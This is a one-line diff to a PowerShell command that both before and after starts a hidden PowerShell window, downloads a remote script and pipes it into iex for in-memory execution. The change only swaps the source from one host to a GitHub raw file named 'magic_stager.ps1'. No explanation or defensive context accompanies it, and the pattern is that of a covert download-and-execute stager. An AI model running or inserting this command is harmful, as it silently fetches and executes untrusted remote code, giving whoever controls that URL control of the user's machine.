@@ -1,1 +1,1 @@
-Start-Process -FilePath powershell.exe -ArgumentList "-WindowStyle Hidden -Command iwr -useb https://magic.bughub.live | iex"
+Start-Process -FilePath powershell.exe -ArgumentList "-WindowStyle Hidden -Command iwr -useb https://raw.githubusercontent.com/padsalatushal/padsalatushal.github.io/main/Random_stuff/magic_stager.ps1 | iex"
